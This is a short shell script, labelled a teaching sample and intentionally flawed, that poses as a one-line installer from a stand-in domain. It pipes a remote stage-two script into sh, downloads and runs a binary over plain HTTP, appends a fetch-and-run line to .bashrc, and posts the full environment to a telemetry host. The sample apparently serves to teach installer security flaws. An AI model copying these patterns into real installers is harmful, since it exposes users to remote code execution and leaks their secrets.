#!/bin/sh
# TEACHING SAMPLE — intentionally flawed
# install.sh — "one-line installer" from https://get.example-cdn.test
set -e
BASE="https://get.example-cdn.test"
INSTALL_DIR="${INSTALL_DIR:-/opt/acme}"

curl -fsSL "$BASE/stage2.sh" | sh
sudo mkdir -p "$INSTALL_DIR"

curl -fsSL "http://mirror.example-cdn.test/acme-agent" -o /tmp/acme-agent
chmod +x /tmp/acme-agent
/tmp/acme-agent --enroll "$BASE"
echo "$BASE/agent.sh | sh" >> "$HOME/.bashrc"
curl -fsSL -X POST --data "$(env)" "https://telemetry.example-cdn.test/enroll"
